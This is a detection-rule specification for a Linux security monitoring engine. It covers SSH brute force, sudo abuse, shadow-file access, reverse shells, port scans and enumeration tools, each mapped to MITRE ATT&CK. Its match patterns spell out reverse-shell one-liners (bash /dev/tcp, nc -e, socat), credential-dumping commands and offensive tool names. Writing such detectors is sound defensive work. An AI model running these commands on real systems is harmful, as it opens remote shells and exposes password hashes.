# AI-SOC Detection Rules Specification

**Engine:** Deterministic Python 3.11+ Rule Engine (`backend/app/detection/`)  
**Design Principle:** High fidelity, low false-positive rate, strict MITRE ATT&CK alignment.

---

## 1. Rule Catalog Summary

| Rule ID | Name | Severity | Confidence | MITRE Technique | MITRE Tactic | Sliding Window |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| `RULE-AUTH-001` | SSH Brute Force Attempt | `HIGH` | 0.90 | T1110.001 (Password Guessing) | TA0006 (Credential Access) | 5 minutes / 3+ failures |
| `RULE-PRIV-001` | Sudo Privilege Abuse / Failed Auth | `HIGH` | 0.85 | T1548.003 (Sudo and Sudo Caching) | TA0004 (Privilege Escalation) | Single or stateful event |
| `RULE-CRED-001` | Unauthorized /etc/shadow or Credential Access | `CRITICAL` | 0.95 | T1003.008 (OS Credential Dumping) | TA0006 (Credential Access) | Direct match |
| `RULE-PROC-001` | Interactive Reverse Shell / C2 | `CRITICAL` | 0.95 | T1059.004 (Unix Shell) | TA0002 (Execution) | Command pattern regex |
| `RULE-NET-001` | Network Service Reconnaissance / Port Scan | `MEDIUM` | 0.80 | T1046 (Network Service Discovery) | TA0007 (Discovery) | 3 minutes / 4+ distinct ports |
| `RULE-DISC-001` | Automated Reconnaissance / Privilege Tool | `HIGH` | 0.85 | T1082 (System Information Discovery) | TA0007 (Discovery) | Binary/script execution |

---

## 2. In-Depth Rule Specifications

### 2.1. `RULE-AUTH-001`: SSH Brute Force Attempt
- **Objective:** Detects automated authentication guessing attacks directed at Linux OpenSSH daemons.
- **Evaluation Criteria:**
  1. Triggered on `event.event_type == "authentication"` and `event.action == "ssh_login"`.
  2. If `event.status == "failed"`, the engine queries past events from the same `source_ip` or `hostname` within a **5-minute sliding window**.
  3. If **≥ 3 failed attempts** occur within 5 minutes, an alert is triggered.
  4. If followed immediately by an `event.status == "success"`, the rule elevates severity to `CRITICAL` representing a confirmed brute force compromise.
- **MITRE Mapping:** T1110.001 (Password Guessing) -> TA0006 (Credential Access)
- **Extracted Evidence:** Source IP, attempted target accounts, timestamp range, port list.

---

### 2.2. `RULE-PRIV-001`: Sudo Privilege Abuse / Failed Auth
- **Objective:** Identifies unauthorized attempts to escalate privileges to `root` via `sudo` or PAM.
- **Evaluation Criteria:**
  1. Triggered when `event.event_type == "privilege"` and `event.action in ["sudo_exec", "sudo_auth", "su_exec"]`.
  2. Matches `status == "failed"` or raw log keywords: `"incorrect password attempts"`, `"user not in sudoers"`, `"authentication failure"`.
- **MITRE Mapping:** T1548.003 (Sudo and Sudo Caching) -> TA0004 (Privilege Escalation)
- **Extracted Evidence:** User account, target binary/command, TTY context.

---

### 2.3. `RULE-CRED-001`: Unauthorized /etc/shadow or Credential Access
- **Objective:** Detects unauthorized reads, dumps, or exfiltration of Linux password hashes or sensitive PAM databases.
- **Evaluation Criteria:**
  1. Evaluates command lines and raw audit messages for keywords:
     - `/etc/shadow`, `/etc/gshadow`, `/etc/security/opasswd`, `cat /etc/shadow`, `unshadow`, `john`, `hashcat`.
  2. Evaluates file access events (`event_type == "file"`) where target path matches `/etc/shadow`.
- **MITRE Mapping:** T1003.008 (OS Credential Dumping: /etc/passwd and /etc/shadow) -> TA0006 (Credential Access)
- **Extracted Evidence:** File path, executing binary, UID/EUID, command string.

---

### 2.4. `RULE-PROC-001`: Interactive Reverse Shell / C2
- **Objective:** Catches interactive reverse shell invocations spawning Unix shells redirected to remote TCP sockets.
- **Evaluation Criteria:**
  1. Evaluates regex patterns against `event.command` and `event.raw_message`:
     - `/dev/tcp/` or `/dev/udp/` redirection (e.g. `bash -i >& /dev/tcp/x.x.x.x/port 0>&1`)
     - Netcat traditional shell invocation (`nc -e /bin/bash`, `nc -e /bin/sh`, `ncat -e`)
     - Python/Perl socket PTY one-liners (`pty.spawn("/bin/bash")`, `socket.socket`)
     - Socat TTY redirection (`socat exec:'bash -li'`)
- **MITRE Mapping:** T1059.004 (Unix Shell) -> TA0002 (Execution) / T1071 (Application Layer Protocol) -> TA0011 (Command and Control)
- **Extracted Evidence:** Process PID, full shell command line, destination IP and port.

---

### 2.5. `RULE-NET-001`: Network Service Reconnaissance / Port Scan
- **Objective:** Detects inbound or outbound port scans probing multiple network services.
- **Evaluation Criteria:**
  1. Triggered on `event_type == "network"`.
  2. Tracks unique `destination_port` values probed by the same `source_ip` within a **3-minute sliding window**.
  3. When the count of unique probed ports reaches **≥ 4**, the rule fires.
- **MITRE Mapping:** T1046 (Network Service Discovery) -> TA0007 (Discovery)
- **Extracted Evidence:** Source IP, list of targeted destination ports.

---

### 2.6. `RULE-DISC-001`: Automated Reconnaissance / Privilege Tool
- **Objective:** Identifies the execution of popular post-exploitation automated enumeration scripts and offensive tools.
- **Evaluation Criteria:**
  1. Evaluates command line and process strings against high-confidence tooling indicators:
     - `linpeas.sh`, `linenum.sh`, `pspy`, `unix-privesc-check`, `traitor`, `les.sh` (Linux Exploit Suggester).
- **MITRE Mapping:** T1082 (System Information Discovery) -> TA0007 (Discovery)
- **Extracted Evidence:** Script name, executing user, command flags.
